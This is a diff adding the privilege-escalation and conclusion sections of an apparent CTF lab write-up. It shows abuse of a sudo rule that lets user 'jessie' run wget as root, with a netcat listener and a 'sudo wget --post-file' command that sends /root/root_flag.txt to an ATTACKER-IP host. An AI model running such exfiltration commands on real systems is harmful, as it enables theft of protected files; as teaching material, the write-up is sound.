@@ -69,3 +69,33 @@ To escalate privileges, I checked the sudo permissions:
 ```sudo -l```
 
 The result showed that the user **jessie** could run `wget` as root.
+
+<img src="assets/sudo-perm.png" width="700">
+
+`Wget` is an open-source command-line utility used to retrieve content and download files from web servers.
+
+# Root Flag
+
+Since `wget` can send HTTP requests, it can be abused to exfiltrate files.
+
+First, a listener was started on the attacker machine:
+
+```nc -lvnp 8000```
+
+Then, the root flag was sent using:
+
+```sudo wget --post-file=/root/root_flag.txt http://ATTACKER-IP:8000```
+
+<img src="assets/root-flag.png" width="700">
+
+The root flag was successfully captured.
+
+# Conclusion:
+
+This machine demonstrates how:
+
++ Misconfigured web directories can expose sensitive files
++ Private SSH keys can lead to initial access
++ Misconfigured sudo permissions can lead to privilege escalation
+
+Even simple tools like `wget` can be dangerous when improperly configured.
